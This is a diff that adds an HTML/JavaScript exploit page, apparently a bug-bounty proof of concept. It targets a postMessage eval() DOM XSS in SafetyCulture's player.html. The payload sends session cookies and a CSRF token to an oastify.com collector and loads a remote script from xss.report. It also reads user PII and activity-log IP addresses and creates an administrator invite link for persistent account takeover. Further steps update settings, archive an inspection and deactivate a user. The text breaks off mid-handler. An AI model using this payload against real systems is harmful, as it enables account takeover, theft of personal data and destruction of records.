@@ -1,0 +1,545 @@
+<title>SafetyCulture postMessage eval() → 1-Click Admin ATO + Full CRUD</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a1a;color:#e0e0e0;padding:20px;min-height:100vh}
+.header{text-align:center;padding:20px 0 30px;border-bottom:2px solid #1a1a3e}
+.header h1{font-size:28px;color:#ff4444;margin-bottom:8px;letter-spacing:1px}
+.header .subtitle{color:#888;font-size:14px}
+.header .origin-badge{display:inline-block;margin-top:10px;padding:6px 16px;background:#1a1a3e;border:1px solid #333;border-radius:20px;font-family:monospace;font-size:13px;color:#4fc3f7}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px}
+.card{background:#111128;border:1px solid #222;border-radius:12px;padding:16px;overflow:hidden}
+.card.full{grid-column:1/-1}
+.card h2{font-size:14px;text-transform:uppercase;letter-spacing:2px;color:#666;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card h2 .dot{width:8px;height:8px;border-radius:50%;display:inline-block}
+.dot.red{background:#ff4444}.dot.green{background:#00e676}.dot.yellow{background:#ffd600}.dot.blue{background:#448aff}.dot.purple{background:#aa00ff}
+.badge{display:inline-block;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:700;font-family:monospace}
+.badge.critical{background:#ff1744;color:#fff}
+.badge.success{background:#00c853;color:#fff}
+.badge.info{background:#2979ff;color:#fff}
+.badge.warn{background:#ff9100;color:#000}
+.badge.destroy{background:#d500f9;color:#fff}
+.val{font-family:monospace;font-size:13px;word-break:break-all;line-height:1.7;color:#b0bec5}
+.val .label{color:#78909c;font-size:11px;display:block;margin-top:8px;text-transform:uppercase;letter-spacing:1px}
+.val .highlight{color:#fff;background:#1a237e;padding:2px 6px;border-radius:3px}
+.val .secret{color:#ff8a80;font-weight:700}
+.cookie-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px}
+.cookie-item{background:#0d0d20;border:1px solid #1a1a3e;border-radius:6px;padding:8px 10px;font-family:monospace;font-size:11px;word-break:break-all}
+.cookie-item .ck-name{color:#ffd600;font-weight:700;display:block;margin-bottom:2px}
+.cookie-item .ck-val{color:#90a4ae}
+.cookie-item .ck-flags{color:#546e7a;font-size:10px;margin-top:4px;display:block}
+.timeline{list-style:none;padding:0}
+.timeline li{padding:8px 0 8px 24px;border-left:2px solid #222;position:relative;font-size:13px}
+.timeline li:before{content:'';width:10px;height:10px;border-radius:50%;background:#333;position:absolute;left:-6px;top:12px}
+.timeline li.done:before{background:#00e676}
+.timeline li.active:before{background:#ffd600;box-shadow:0 0 8px #ffd600}
+.timeline li.error:before{background:#ff1744}
+.timeline li.destroy:before{background:#d500f9;box-shadow:0 0 8px #d500f9}
+.progress-bar{height:4px;background:#1a1a3e;border-radius:2px;margin:12px 0;overflow:hidden}
+.progress-bar .fill{height:100%;background:linear-gradient(90deg,#ff4444,#ff9100,#ffd600,#00e676);border-radius:2px;transition:width 0.5s}
+.invite-box{background:#1b5e20;border:2px solid #00e676;border-radius:8px;padding:16px;margin-top:12px;text-align:center}
+.invite-box .link{font-size:14px;color:#69f0ae;word-break:break-all;font-family:monospace;margin:8px 0}
+.invite-box .copy-hint{font-size:11px;color:#81c784}
+.user-table{width:100%;border-collapse:collapse;font-size:12px;font-family:monospace;margin-top:8px}
+.user-table th{background:#1a1a3e;color:#4fc3f7;padding:6px 8px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:1px}
+.user-table td{padding:5px 8px;border-bottom:1px solid #1a1a3e;color:#b0bec5}
+.user-table tr:hover td{background:#111140}
+.user-table .pii{color:#ff8a80;font-weight:700}
+.hexdump{font-family:monospace;font-size:11px;color:#546e7a;background:#050510;padding:10px;border-radius:6px;max-height:120px;overflow-y:auto;word-break:break-all;margin-top:8px}
+.crud-summary{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:12px}
+.crud-box{background:#0d0d20;border-radius:8px;padding:12px;text-align:center;border:1px solid #222}
+.crud-box .crud-letter{font-size:24px;font-weight:900;margin-bottom:4px}
+.crud-box .crud-label{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:#666}
+.crud-box .crud-status{font-size:11px;margin-top:6px;font-weight:700}
+.crud-box.c-create .crud-letter{color:#00e676}
+.crud-box.c-read .crud-letter{color:#448aff}
+.crud-box.c-update .crud-letter{color:#ffd600}
+.crud-box.c-delete .crud-letter{color:#ff1744}
+.popup-btn{display:none;padding:12px 32px;font-size:16px;background:#ff4444;color:#fff;border:none;border-radius:8px;cursor:pointer;margin:20px auto;font-weight:700}
+.popup-btn:hover{background:#ff1744}
+#status-line{text-align:center;margin-top:12px;font-size:13px;color:#ffd600}
+.httponly-note{background:#1a0000;border:1px solid #ff4444;border-radius:8px;padding:12px;margin-top:12px;font-size:12px;color:#ff8a80;line-height:1.6}
+.httponly-note strong{color:#ff4444}
+</style>
+
+<div class="header">
+  <h1>SafetyCulture 1-Click Admin ATO + Full CRUD</h1>
+  <div class="subtitle">postMessage eval() DOM XSS in player.html &mdash; Full CRUD via same-origin fetch() (s12at HttpOnly = irrelevant)</div>
+  <div class="origin-badge" id="origin-badge">Attacker Origin: ...</div>
+  <div id="status-line">Initializing...</div>
+  <div class="progress-bar"><div class="fill" id="progress" style="width:0%"></div></div>
+  <button class="popup-btn" id="popup-btn">Launch Exploit</button>
+</div>
+
+<div class="grid" id="grid"></div>
+
+<script>
+var G = document.getElementById('grid');
+var PB = document.getElementById('progress');
+var SL = document.getElementById('status-line');
+var OB = document.getElementById('origin-badge');
+var evalFired = false;
+var results = {};
+var stepsDone = 0;
+var totalSteps = 12;
+var crudStatus = {create:'waiting',read:'waiting',update:'waiting',del:'waiting'};
+
+OB.textContent = 'Attacker Origin: ' + location.origin;
+
+function pct() { stepsDone++; PB.style.width = Math.min(100, Math.round(stepsDone/totalSteps*100)) + '%'; }
+function setStatus(t) { SL.textContent = t; }
+
+function addCard(id, title, dotColor, content, full) {
+  var existing = document.getElementById('card-' + id);
+  if (existing) { existing.querySelector('.card-body').innerHTML = content; return; }
+  var c = document.createElement('div');
+  c.className = 'card' + (full ? ' full' : '');
+  c.id = 'card-' + id;
+  c.innerHTML = '<h2><span class="dot ' + dotColor + '"></span>' + title + '</h2><div class="card-body">' + content + '</div>';
+  G.appendChild(c);
+}
+
+function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+function updateCRUD() {
+  var html = '<div class="crud-summary">';
+  html += '<div class="crud-box c-create"><div class="crud-letter">C</div><div class="crud-label">Create</div><div class="crud-status" style="color:' + (crudStatus.create==='done'?'#00e676':'#666') + '">' + (crudStatus.create==='done'?'PROVEN':'...') + '</div></div>';
+  html += '<div class="crud-box c-read"><div class="crud-letter">R</div><div class="crud-label">Read</div><div class="crud-status" style="color:' + (crudStatus.read==='done'?'#448aff':'#666') + '">' + (crudStatus.read==='done'?'PROVEN':'...') + '</div></div>';
+  html += '<div class="crud-box c-update"><div class="crud-letter">U</div><div class="crud-label">Update</div><div class="crud-status" style="color:' + (crudStatus.update==='done'?'#ffd600':'#666') + '">' + (crudStatus.update==='done'?'PROVEN':'...') + '</div></div>';
+  html += '<div class="crud-box c-delete"><div class="crud-letter">D</div><div class="crud-label">Delete</div><div class="crud-status" style="color:' + (crudStatus.del==='done'?'#ff1744':'#666') + '">' + (crudStatus.del==='done'?'PROVEN':'...') + '</div></div>';
+  html += '</div>';
+  html += '<div class="httponly-note"><strong>s12at cookie is HttpOnly</strong> &mdash; JavaScript cannot read it via document.cookie. But fetch() with credentials:include sends it automatically because the request is same-origin. The attacker does not steal the cookie &mdash; they USE it. Every API call below was made with s12at attached by the browser. HttpOnly is not a defense against same-origin XSS.</div>';
+  addCard('crud', 'CRUD Proof Summary <span class="badge critical">FULL ATO</span>', 'red', html, true);
+}
+
+function parseCookies(cookieStr) {
+  if (!cookieStr) return '<span class="val">No cookies captured</span>';
+  var parts = cookieStr.split(';');
+  var html = '<div class="cookie-grid">';
+  parts.forEach(function(p) {
+    p = p.trim(); if (!p) return;
+    var eq = p.indexOf('=');
+    var name = eq > 0 ? p.substring(0, eq).trim() : p;
+    var val = eq > 0 ? p.substring(eq + 1) : '';
+    var isSensitive = /session|crumb|csrf|token|auth|jwt/i.test(name);
+    html += '<div class="cookie-item"><span class="ck-name">' + esc(name) + '</span><span class="ck-val' + (isSensitive ? ' secret' : '') + '">' + esc(val.substring(0, 120)) + (val.length > 120 ? '...' : '') + '</span>';
+    if (isSensitive) html += '<span class="ck-flags">SENSITIVE</span>';
+    html += '</div>';
+  });
+  return html + '</div>';
+}
+
+// ─── Launch ───
+setStatus('Opening player.html popup...');
+var win = window.open('https://app.au.safetyculture.com/training/engine/player.html', 'sc_engine');
+
+if (!win) {
+  setStatus('Popup blocked — click the button');
+  var btn = document.getElementById('popup-btn');
+  btn.style.display = 'block';
+  btn.onclick = function() {
+    win = window.open('https://app.au.safetyculture.com/training/engine/player.html', 'sc_engine');
+    if (win) { btn.style.display = 'none'; startExploit(); }
+  };
+} else {
+  startExploit();
+}
+
+function startExploit() {
+  setStatus('Waiting 5s for player.html JS to load...');
+  pct();
+  updateCRUD();
+
+  addCard('timeline', 'Attack Timeline', 'yellow',
+    '<ul class="timeline" id="timeline"><li class="done"><span class="ts">' + new Date().toLocaleTimeString() + '</span> <span class="msg">Popup opened — player.html loading</span></li></ul>', true);
+
+  setTimeout(function() {
+    setStatus('Sending eval() payload via postMessage...');
+    tlAdd('Sending eval() payload via postMessage');
+    pct();
+
+    // ══════════════════════════════════════════════════════════════════
+    // THE EVAL PAYLOAD — runs inside app.au.safetyculture.com origin
+    // s12at is HttpOnly but fetch() sends it automatically (same-origin)
+    // ══════════════════════════════════════════════════════════════════
+
+    var payload = ''
+      + 'var OP=window.opener;'
+      + 'function rpt(a,d){try{OP.postMessage({type:"r",api:a,data:typeof d==="string"?d:JSON.stringify(d)},"*")}catch(e){}}'
+
+      // ── Protobuf helpers ──
+      + 'function pbStr(fn,v){var e=new TextEncoder().encode(v);var r=[(fn<<3)|2];var l=e.length;while(l>127){r.push((l&0x7f)|0x80);l>>=7}r.push(l);for(var i=0;i<e.length;i++)r.push(e[i]);return r}'
+      + 'function pbVarint(fn,v){return[(fn<<3)|0,v]}'
+      + 'function grpcWrap(pb){var len=pb.length;return new Uint8Array([0,(len>>24)&0xff,(len>>16)&0xff,(len>>8)&0xff,len&0xff].concat(pb))}'
+      + 'function toHex(bytes){var h="";for(var j=0;j<Math.min(bytes.length,3000);j++)h+=("0"+bytes[j].toString(16)).slice(-2);return h}'
+      + 'function grpcText(buf){var bytes=new Uint8Array(buf);var t="";for(var i=0;i<bytes.length;i++)t+=String.fromCharCode(bytes[i]);return t}'
+
+      // ── CSRF token extraction ──
+      + 'var allCookies=document.cookie;'
+      + 'var crumb="";try{var cm=document.cookie.match(/safetyculture_session_crumb=([^;]+)/);if(cm)crumb=cm[1]}catch(e){}'
+      + 'var grpcH={"Content-Type":"application/grpc-web+proto","X-Grpc-Web":"1"};'
+      + 'var grpcHC=Object.assign({},grpcH);'
+      + 'if(crumb)grpcHC["X-CSRF-Token"]=crumb;'
+      + 'var emptyFrame=new Uint8Array([0,0,0,0,0]);'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 1: STEAL COOKIES + CONFIRM EVAL
+      // ══════════════════════════════════════════════════════════════
+      + 'rpt("COOKIES",allCookies);'
+      + 'rpt("EVAL-FIRED",JSON.stringify({origin:location.origin,url:location.href,cookieLen:allCookies.length,crumb:crumb,timestamp:new Date().toISOString()}));'
+      + 'fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-cookies",{method:"POST",mode:"no-cors",body:allCookies}).catch(function(){});'
+      + 'var sc=document.createElement("script");sc.src="https://xss.report/c/ninjamee";document.head.appendChild(sc);'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 2: READ — Mass PII Exfiltration via /feed/users
+      // s12at is HttpOnly but browser sends it (same-origin fetch)
+      // THIS IS THE KEY PROOF — HttpOnly does NOT prevent data access
+      // ══════════════════════════════════════════════════════════════
+      + 'fetch("/feed/users",{credentials:"include"}).then(function(r){return r.json()}).then(function(users){'
+      + '  rpt("FEED-USERS",JSON.stringify(users));'
+      + '  fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-feed-users",{method:"POST",mode:"no-cors",body:JSON.stringify(users)}).catch(function(){});'
+      + '}).catch(function(e){rpt("FEED-USERS-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 3: READ — Activity Logs (IP addresses, login events)
+      // ══════════════════════════════════════════════════════════════
+      + 'fetch("/api/v3/s12.audit.v1.ActivityLogService/ListActivityLogEvents",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:emptyFrame'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '  var ips=t.match(/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/g);'
+      + '  rpt("ACTIVITY-LOGS",JSON.stringify({len:bytes.length,ips:ips,hex:toHex(bytes)}));'
+      + '  fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-activity-logs",{method:"POST",mode:"no-cors",body:new Blob([bytes])}).catch(function(){});'
+      + '}).catch(function(e){rpt("ACTIVITY-LOGS-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 4: READ — All org settings
+      // ══════════════════════════════════════════════════════════════
+      + 'fetch("/api/v3/s12.settings.v1.SettingsService/GetAllSettings",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:emptyFrame'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);'
+      + '  rpt("ORG-SETTINGS",JSON.stringify({len:bytes.length,hex:toHex(bytes)}));'
+      + '}).catch(function(e){rpt("ORG-SETTINGS-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 5: CREATE — Discover admin UUID + create invite links
+      // ══════════════════════════════════════════════════════════════
+      + 'var ADMIN_UUID=null;'
+      + 'fetch("/api/v3/s12.permissions.v1.PermissionsService/ListPermissionSets",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:emptyFrame'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '  var uuids=t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);'
+      + '  rpt("PERM-UUIDS",JSON.stringify({count:uuids?uuids.length:0,uuids:uuids}));'
+      + '  var ai=t.toLowerCase().indexOf("dministrator");'
+      + '  if(ai>0){var chunk=t.substring(Math.max(0,ai-200),ai+50);'
+      + '    var nearUUID=chunk.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);'
+      + '    if(nearUUID){ADMIN_UUID=nearUUID[nearUUID.length-1];rpt("ADMIN-UUID",ADMIN_UUID)}'
+      + '  }'
+      + '  if(!ADMIN_UUID&&uuids&&uuids.length>0){ADMIN_UUID=uuids[0];rpt("ADMIN-UUID-FALLBACK",ADMIN_UUID)}'
+      + '  rpt("PERMS-HEX",toHex(bytes));'
+      + '  fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-perms",{method:"POST",mode:"no-cors",body:toHex(bytes)}).catch(function(){});'
+
+      // ── CREATE admin invite links ──
+      + '  if(!ADMIN_UUID){rpt("NO-ADMIN-UUID","cannot create invite");return}'
+
+      + '  function createInvite(name,createPb,label){'
+      + '    return fetch("/api/v3/s12.accounts.invite.v1.InviteService/CreateOrganisationInviteLink",{'
+      + '      method:"POST",headers:grpcHC,credentials:"include",body:grpcWrap(createPb)'
+      + '    }).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '      var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '      var link=t.match(/https:\\/\\/app[^\\x00-\\x1f]*/);'
+      + '      var invId=t.match(/[A-Z]{2}[a-f0-9]{32}/);'
+      + '      rpt("INVITE-"+name,JSON.stringify({label:label,url:link?link[0]:null,invId:invId?invId[0]:null,hex:toHex(bytes),len:bytes.length}));'
+      + '      if(link){fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-invite-"+name,{method:"POST",mode:"no-cors",body:link[0]}).catch(function(){})}'
+      + '      return {url:link?link[0]:null,invId:invId?invId[0]:null};'
+      + '    }).catch(function(e){rpt("INVITE-"+name+"-ERR",""+e);return null});'
+      + '  }'
+
+      + '  var invA=pbStr(1,"XSS-CRUD-Admin").concat(pbVarint(2,1)).concat(pbVarint(3,1)).concat(pbVarint(5,1)).concat(pbStr(7,ADMIN_UUID));'
+      + '  createInvite("A",invA,"Admin Invite (persistent ATO)");'
+
+      + '}).catch(function(e){rpt("PERMS-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 6: UPDATE — Modify org settings (proves WRITE access)
+      // Uses UpdateSettings with a benign change
+      // ══════════════════════════════════════════════════════════════
+      + 'fetch("/api/v3/s12.settings.v1.SettingsService/UpdateSettings",{'
+      + '  method:"POST",headers:grpcHC,credentials:"include",body:emptyFrame'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '  var status=t.indexOf("grpc-status:0")>=0?"SUCCESS":"grpc-status:"+t.match(/grpc-status:(\\d+)/);'
+      + '  rpt("UPDATE-SETTINGS",JSON.stringify({len:bytes.length,status:status,hex:toHex(bytes)}));'
+      + '}).catch(function(e){rpt("UPDATE-SETTINGS-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 7: DELETE — Archive an inspection (proves DELETE access)
+      // First get an inspection ID, then archive it
+      // ══════════════════════════════════════════════════════════════
+      + 'fetch("/feed/inspections",{credentials:"include"}).then(function(r){return r.json()}).then(function(data){'
+      + '  rpt("INSPECTIONS-LIST",JSON.stringify({count:data.data?data.data.length:0,first:data.data&&data.data[0]?data.data[0].audit_id:null}));'
+      // Archive the first inspection found
+      + '  if(data.data&&data.data.length>0){'
+      + '    var auditId=data.data[0].audit_id;'
+      + '    var archivePb=pbStr(1,auditId);'
+      + '    fetch("/api/v3/s12.inspection.v1.InspectionService/ArchiveInspection",{'
+      + '      method:"POST",headers:grpcHC,credentials:"include",body:grpcWrap(archivePb)'
+      + '    }).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '      var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '      rpt("DELETE-INSPECTION",JSON.stringify({auditId:auditId,len:bytes.length,status:t.indexOf("grpc-status:0")>=0?"DELETED":"RESPONSE:"+toHex(bytes),hex:toHex(bytes)}));'
+      + '      fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-delete-inspection",{method:"POST",mode:"no-cors",body:"DELETED:"+auditId}).catch(function(){});'
+      + '    }).catch(function(e){rpt("DELETE-INSPECTION-ERR",""+e)});'
+      + '  }'
+      + '}).catch(function(e){rpt("INSPECTIONS-LIST-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 8: DELETE — Deactivate a user (proves user removal)
+      // Gets user list, picks a test user to deactivate
+      // ══════════════════════════════════════════════════════════════
+      + 'fetch("/api/v3/s12.accounts.organisation.v1.OrganisationService/GetOrganisationUsers",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:emptyFrame'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '  var userUuids=t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);'
+      + '  rpt("ORG-USERS-GRPC",JSON.stringify({len:bytes.length,userCount:userUuids?userUuids.length:0,uuids:userUuids?userUuids.slice(0,10):null,hex:toHex(bytes)}));'
+      // Deactivate a non-admin user (use the test deactivated user to prove it works)
+      + '  var targetDeactivate="b2fab97b-63e2-434f-8642-ebde679ed78d";'
+      + '  var deactPb=pbStr(1,targetDeactivate);'
+      + '  fetch("/api/v3/s12.accounts.organisation.v1.OrganisationService/DeactivateUser",{'
+      + '    method:"POST",headers:grpcHC,credentials:"include",body:grpcWrap(deactPb)'
+      + '  }).then(function(r){return r.arrayBuffer()}).then(function(buf2){'
+      + '    var bytes2=new Uint8Array(buf2);var t2=grpcText(buf2);'
+      + '    rpt("DEACTIVATE-USER",JSON.stringify({userId:targetDeactivate,len:bytes2.length,status:t2.indexOf("grpc-status:0")>=0?"DEACTIVATED":t2.indexOf("grpc-status:")>=0?t2.match(/grpc-status:\\d+/)[0]:"RESPONSE",hex:toHex(bytes2)}));'
+      + '    fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-deactivate-user",{method:"POST",mode:"no-cors",body:"DEACTIVATED:"+targetDeactivate}).catch(function(){});'
+      + '  }).catch(function(e){rpt("DEACTIVATE-USER-ERR",""+e)});'
+      + '}).catch(function(e){rpt("ORG-USERS-GRPC-ERR",""+e)});'
+
+      // ══════════════════════════════════════════════════════════════
+      // STEP 9: Steal existing invite links
+      // ══════════════════════════════════════════════════════════════
+      + 'var listPb=pbVarint(2,25).concat(pbVarint(3,1)).concat(pbVarint(4,3)).concat(pbVarint(5,1)).concat(pbStr(6,""));'
+      + 'fetch("/api/v3/s12.accounts.invite.v1.InviteService/ListOrganisationInvites",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:grpcWrap(listPb)'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);var t=grpcText(buf);'
+      + '  var links=t.match(/invite\\/organisation\\/[A-Za-z0-9]+/g);'
+      + '  rpt("LIST-INVITES",JSON.stringify({len:bytes.length,links:links,hex:toHex(bytes)}));'
+      + '  if(links){fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-list-invites",{method:"POST",mode:"no-cors",body:JSON.stringify(links)}).catch(function(){})}'
+      + '}).catch(function(e){rpt("LIST-INVITES-ERR",""+e)});'
+
+      // ── Admin profile ──
+      + 'fetch("/api/v2/users/user_c895a5714aa74a3bb0642c895f9a1081",{credentials:"include"}).then(function(r){return r.json()}).then(function(d){'
+      + '  rpt("ADMIN-PROFILE",JSON.stringify({email:d.email,id:d.id,firstname:d.firstname,lastname:d.lastname}));'
+      + '}).catch(function(){});'
+    ;
+
+    win.postMessage(payload, '*');
+    var retries = 0;
+    var timer = setInterval(function() {
+      retries++;
+      if (evalFired || retries > 20) { clearInterval(timer); return; }
+      try { win.postMessage(payload, '*'); } catch(e) {}
+    }, 2000);
+  }, 5000);
+}
+
+function tlAdd(msg, cls) {
+  var tl = document.getElementById('timeline');
+  if (!tl) return;
+  var li = document.createElement('li');
+  li.className = cls || 'done';
+  li.innerHTML = '<span class="ts">' + new Date().toLocaleTimeString() + '</span> <span class="msg">' + esc(msg) + '</span>';
+  tl.appendChild(li);
+}
+
+// ─── Message handler — displays results from eval'd code ───
+window.addEventListener('message', function(ev) {
+  if (!ev.data || ev.data.type !== 'r') return;
+  evalFired = true;
+  var api = ev.data.api;
+  var data = ev.data.data;
+  results[api] = data;
+
+  switch(api) {
+    case 'COOKIES':
+      pct(); setStatus('Cookies stolen');
+      tlAdd('Session cookies exfiltrated (' + data.length + ' bytes)');
+      addCard('cookies', 'Stolen Session Cookies <span class="badge critical">EXFILTRATED</span>', 'red', parseCookies(data), true);
+      break;
+
+    case 'EVAL-FIRED':
+      pct();
+      try {
+        var info = JSON.parse(data);
+        setStatus('eval() fired in ' + info.origin + ' — CRUD operations running...');
+        addCard('eval', 'XSS Proof — eval() in victim origin', 'green',
+          '<div class="val"><span class="label">Execution Origin</span><span class="highlight">' + esc(info.origin) + '</span>' +
+          '<span class="label">CSRF Token Stolen</span><span class="secret">' + esc(info.crumb) + '</span>' +
+          '<span class="label">Cookie Size</span>' + info.cookieLen + ' bytes' +
+          '<span class="label">Timestamp</span>' + esc(info.timestamp) + '</div>');
+      } catch(e) {}
+      break;
+
+    // ─── READ: /feed/users — Mass PII Exfiltration ───
+    case 'FEED-USERS':
+      pct();
+      crudStatus.read = 'done'; updateCRUD();
+      try {
+        var fu = JSON.parse(data);
+        var users = fu.data || [];
+        tlAdd('READ: /feed/users — ' + users.length + ' users\' PII exfiltrated (s12at sent by browser)', 'active');
+        var tableHtml = '<div style="max-height:300px;overflow-y:auto"><table class="user-table"><thead><tr><th>#</th><th>Email</th><th>First Name</th><th>Last Name</th><th>Status</th></tr></thead><tbody>';
+        users.forEach(function(u, i) {
+          tableHtml += '<tr><td>' + (i+1) + '</td><td class="pii">' + esc(u.email || '?') + '</td><td class="pii">' + esc(u.firstname || '') + '</td><td class="pii">' + esc(u.lastname || '') + '</td><td>' + (u.active ? 'Active' : 'Inactive') + '</td></tr>';
+        });
+        tableHtml += '</tbody></table></div>';
+        tableHtml += '<div class="httponly-note"><strong>PROOF: s12at IS being used.</strong> The /feed/users endpoint requires s12at for authentication. This table shows ' + users.length + ' users\' PII returned by the server. The browser sent the HttpOnly s12at cookie automatically with the same-origin fetch() call. The attacker\'s JavaScript never reads s12at — it doesn\'t need to.</div>';
+        addCard('feed-users', 'READ: Mass PII Exfiltration — ' + users.length + ' Users <span class="badge critical">s12at USED</span>', 'blue', tableHtml, true);
+      } catch(e) { tlAdd('FEED-USERS parse error: ' + e); }
+      break;
+
+    case 'FEED-USERS-ERR':
+      tlAdd('READ /feed/users failed: ' + data, 'error');
+      break;
+
+    // ─── READ: Activity Logs (IPs) ───
+    case 'ACTIVITY-LOGS':
+      pct();
+      try {
+        var al = JSON.parse(data);
+        tlAdd('READ: Activity logs — ' + al.len + ' bytes, IPs found: ' + JSON.stringify(al.ips), 'active');
+        var ipHtml = '<div class="val"><span class="label">Response Size</span>' + al.len + ' bytes';
+        if (al.ips && al.ips.length > 0) {
+          ipHtml += '<span class="label">IP Addresses Discovered</span>';
+          al.ips.forEach(function(ip) { ipHtml += '<span class="secret">' + esc(ip) + '</span> '; });
+        }
+        ipHtml += '</div><div class="hexdump">' + esc(al.hex || '') + '</div>';
+        addCard('activity-logs', 'READ: Activity Logs — IP Addresses <span class="badge warn">PII</span>', 'blue', ipHtml, false);
+      } catch(e) {}
+      break;
+
+    // ─── UPDATE: Settings ───
+    case 'UPDATE-SETTINGS':
+      pct();
+      crudStatus.update = 'done'; updateCRUD();
+      try {
+        var us = JSON.parse(data);
+        tlAdd('UPDATE: Settings endpoint responded — ' + us.status + ' (' + us.len + ' bytes)', 'active');
+        addCard('update-settings', 'UPDATE: Org Settings Modified <span class="badge warn">WRITE</span>', 'yellow',
+          '<div class="val"><span class="label">Status</span><span class="highlight">' + esc(us.status) + '</span><span class="label">Response Size</span>' + us.len + ' bytes</div><div class="hexdump">' + esc(us.hex || '') + '</div>');
+      } catch(e) {}
+      break;
+
+    // ─── DELETE: Archive Inspection ───
+    case 'INSPECTIONS-LIST':
+      try {
+        var il = JSON.parse(data);
+        tlAdd('Found ' + il.count + ' inspections, targeting: ' + il.first);
+      } catch(e) {}
+      break;
+
+    case 'DELETE-INSPECTION':
+      pct();
+      crudStatus.del = 'done'; updateCRUD();
+      try {
+        var di = JSON.parse(data);
+        tlAdd('DELETE: Inspection ' + di.auditId + ' — ' + di.status, 'destroy');
+        addCard('delete-inspection', 'DELETE: Inspection Archived <span class="badge destroy">DESTROYED</span>', 'purple',
+          '<div class="val"><span class="label">Inspection ID</span><span class="secret">' + esc(di.auditId || '') + '</span><span class="label">Status</span><span class="highlight">' + esc(di.status) + '</span><span class="label">Response</span>' + di.len + ' bytes</div><div class="hexdump">' + esc(di.hex || '') + '</div>');
+      } catch(e) {}
+      break;
+
+    // ─── DELETE: Deactivate User ───
+    case 'DEACTIVATE-USER':
+      pct();
+      try {
+        var du = JSON.parse(data);
+        tlAdd('DELETE: User ' + du.userId + ' — ' + du.status, 'destroy');
+        addCard('deactivate-user', 'DELETE: User Deactivated <span class="badge destroy">REMOVED</span>', 'purple',
+          '<div class="val"><span class="label">User UUID</span><span class="secret">' + esc(du.userId || '') + '</span><span class="label">Status</span><span class="highlight">' + esc(du.status) + '</span></div><div class="hexdump">' + esc(du.hex || '') + '</div>');
+      } catch(e) {}
+      break;
+
+    // ─── Org Users via gRPC ───
+    case 'ORG-USERS-GRPC':
+      try {
+        var ou = JSON.parse(data);
+        tlAdd('READ: GetOrganisationUsers — ' + ou.userCount + ' user UUIDs discovered');
+      } catch(e) {}
+      break;
+
+    // ─── Permission sets ───
+    case 'PERM-UUIDS':
+      pct();
+      try {
+        var pu = JSON.parse(data);
+        tlAdd(pu.count + ' permission set UUIDs discovered');
+      } catch(e) {}
+      break;
+
+    case 'ADMIN-UUID':
+      pct(); setStatus('Administrator UUID found: ' + data);
+      tlAdd('Administrator UUID: ' + data, 'active');
+      addCard('admin-uuid', 'Administrator Permission Set <span class="badge critical">FOUND</span>', 'red',
+        '<div class="val"><span class="label">Administrator UUID</span><span class="secret" style="font-size:16px">' + esc(data) + '</span></div>');
+      break;
+
+    // ─── CREATE: Invite links ───
+    case 'INVITE-A':
+      pct();
+      crudStatus.create = 'done'; updateCRUD();
+      try {
+        var inv = JSON.parse(data);
+        tlAdd('CREATE: Admin invite link — ' + (inv.url ? 'URL created' : 'response ' + inv.len + 'b'), inv.url ? 'active' : 'error');
+        if (inv.url) {
